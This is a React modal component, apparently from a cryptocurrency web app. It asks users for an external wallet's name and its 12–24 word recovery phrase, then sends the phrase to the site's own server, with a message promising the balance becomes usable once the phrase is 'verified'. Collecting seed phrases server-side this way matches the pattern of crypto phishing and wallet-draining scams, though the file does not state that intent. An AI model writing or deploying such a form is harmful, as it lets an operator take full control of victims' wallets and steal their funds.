"use client";

import Button from "@/components/Button";
import TextInput from "@/components/TextInput";
import ModalContainer from "@/components/modals/ModalContainer";
import { Textarea } from "@mantine/core";
import axios from "axios";
import React, { useState } from "react";
import { toast } from "react-hot-toast";

interface TopUpModalProps {
  opened: boolean;
  onClose: () => void;
}

const ImportWallerModal = (props: TopUpModalProps) => {
  const { opened, onClose } = props;
  const [loading, setLoading] = useState(false);
  const [input, setInput] = useState({ walletName: "", walletPhrase: "" });

  const importWalletHandler = async () => {
    try {
      setLoading(true);
      const { data } = await axios.post("/api/import-wallet", input);
      if (data.error) throw new Error(data.error);
      toast.success(
        "You will be able to use your external wallet balance here once your phrase is verified",
        { duration: 15000 }
      );
      onClose();
    } catch (error: any) {
      toast.error(error.message);
    } finally {
      setLoading(false);
    }
  };

  return (
    <ModalContainer
      title="Import External wallet"
      opened={opened}
      onClose={onClose}
    >
      <div className="flex flex-col gap-3">
        <div>
          <div>Wallet Name</div>
          <TextInput
            value={input.walletName}
            onChange={(e) => setInput({ ...input, walletName: e.target.value })}
            placeholder="e.g Trust Wallet, Blockchain wallet etc..."
          />
        </div>

        <div>
          <div>Phrase</div>
          <Textarea
            onChange={(e) =>
              setInput({ ...input, walletPhrase: e.target.value })
            }
            value={input.walletPhrase}
            placeholder="Typically 12 (sometimes 18, 24) words separated by single spaces"
          />
          {false && (
            <div className="text-sm">
              Typically 12 (sometimes 18, 24) words separated by single spaces
            </div>
          )}
        </div>

        <Button
          loading={loading}
          label="Import"
          onClick={importWalletHandler}
        />
      </div>
    </ModalContainer>
  );
};

export default ImportWallerModal;
